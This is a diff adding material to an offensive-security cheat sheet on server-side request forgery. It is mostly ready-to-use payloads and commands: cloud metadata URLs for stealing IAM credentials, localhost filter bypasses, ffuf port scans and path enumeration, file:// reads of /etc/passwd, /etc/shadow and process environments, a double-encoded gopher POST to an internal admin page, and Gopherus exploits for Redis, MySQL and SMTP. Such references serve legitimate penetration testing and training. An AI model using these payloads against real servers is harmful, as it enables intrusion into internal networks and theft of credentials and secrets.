@@ -1,11 +1,24 @@
 ---
 title: "SSRF"
 ---
+
+SSRF (Server-Side Request Forgery) occurs when a web application fetches a remote resource based on user-supplied input and an attacker can manipulate that input to make the server request arbitrary URLs. Depending on configuration, this can range from minor information disclosure to full internal network access and RCE.
+
+## Confirming SSRF
+
+Start with a URL pointing at a host you control and listen for the callback. If the request arrives, SSRF is confirmed.
+
+```bash wrap
+nc -lnvp 8000
+```
+
+Supply `http://$LHOST:8000/test` in the vulnerable parameter and watch for the incoming request.
+
 ## Basic Payloads
 
 Hit localhost and the link-local range first: internal services and cloud metadata endpoints are the most common targets.
 
-``` wrap
+```wrap
 http://127.0.0.1/
 http://localhost/
 http://169.254.169.254/
@@ -17,28 +30,118 @@ http://0.0.0.0/
 
 The IMDSv1 endpoint hands out IAM credentials with no auth: if the app is on EC2 and SSRF is confirmed, hit this immediately.
 
-``` wrap
+```wrap
 http://169.254.169.254/latest/meta-data/
 http://169.254.169.254/latest/meta-data/iam/security-credentials/
 ```
 
 ## Bypass Filters
 
-Blocklists keyed on "127.0.0.1" or "localhost" miss decimal, hex, and wildcard DNS representations: try alternatives when the obvious payloads are blocked.
+Blocklists keyed on "127.0.0.1" or "localhost" miss decimal, hex, and wildcard DNS representations.
 
-``` wrap
+```wrap
 http://127.1/
 http://0x7f000001/
 http://2130706433/
 http://127.0.0.1.nip.io/
 ```
 
+## Port Scanning
+
+Use SSRF to sweep internal ports. A closed port typically returns a connection refused error; an open port returns a response or times out differently. Compare error messages to distinguish open from closed.
+
+```bash wrap
+# Manual: supply different ports and compare responses
+http://127.0.0.1:22/
+http://127.0.0.1:3306/
+http://127.0.0.1:6379/
+
+# ffuf sweep against localhost
+ffuf -w ports.txt \
+  -u http://$TARGET/index.php \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "url=http://127.0.0.1:FUZZ" \
+  -fr "Connection refused"
+```
+
+## Internal Endpoint Enumeration
+
+Once you identify an internal hostname, enumerate its paths through the SSRF parameter.
+
+```bash wrap
+ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
+  -u http://$TARGET/index.php \
+  -X POST \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "dateserver=http://internal.host/FUZZ.php&date=2024-01-01" \
+  -fr "Server at internal.host Port 80"
+```
+
+Filter on the error string that appears for non-existent pages to keep only valid hits.
+
+## File Read via file://
+
+Switch to the `file://` scheme to read local files from the server's filesystem.
+
+```wrap
+file:///etc/passwd
+file:///etc/shadow
+file:///var/www/html/config.php
+file:///proc/self/environ
+```
+
 ## Protocol Smuggling
 
 Switch protocols to reach non-HTTP internal services: gopher is especially powerful for attacking Redis, memcached, and SMTP.
 
-``` wrap
-file:///etc/passwd
+```wrap
 dict://127.0.0.1:6379/
 gopher://127.0.0.1:6379/
 ```
+
+## Gopher: Sending POST Requests
+
+The `gopher://` scheme sends raw bytes to a TCP socket, letting you craft arbitrary HTTP requests including POST bodies. This is useful when the SSRF target requires a POST request that the `http://` scheme cannot send.
+
+Build the raw request, URL-encode spaces as `%20` and newlines as `%0D%0A`, prefix with `gopher://host:port/_`, then double-encode the entire URL because the parameter itself is URL-encoded.
+
+```wrap
+# Target POST request
+POST /admin.php HTTP/1.1
+Host: internal.host
+Content-Length: 13
+Content-Type: application/x-www-form-urlencoded
+
+adminpw=admin
+
+# Assembled gopher URL (single-encoded)
+gopher://internal.host:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20internal.host%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
+
+# Send inside an HTTP POST parameter (double-encoded)
+dateserver=gopher%3a//internal.host%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520internal.host%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin
+```
+
+## Gopherus
+
+Gopherus automates gopher URL construction for common internal services.
+
+```bash wrap
+# Supported: mysql, postgresql, fastcgi, redis, smtp, zabbix, pymemcache, rbmemcache, phpmemcache, dmpmemcache
+python2.7 gopherus.py --exploit smtp
+python2.7 gopherus.py --exploit redis
+python2.7 gopherus.py --exploit mysql
+```
+
+After providing the prompted inputs, Gopherus outputs a ready-to-use gopher URL. Double-encode it before inserting into a URL-encoded POST parameter.
+
+## Blind SSRF
+
+When the response is not reflected back, you can only infer whether the request was made by checking your listener for callbacks.
+
+```bash wrap
+nc -lnvp 8000
+# or use Burp Collaborator / interactsh
+```
+
+If no callback arrives when pointing at your server but the app behaves differently when pointing at an internal host, the SSRF is still useful for port scanning via timing or error message differences. Full exploitation (file read, gopher POST) is unavailable without response reflection.
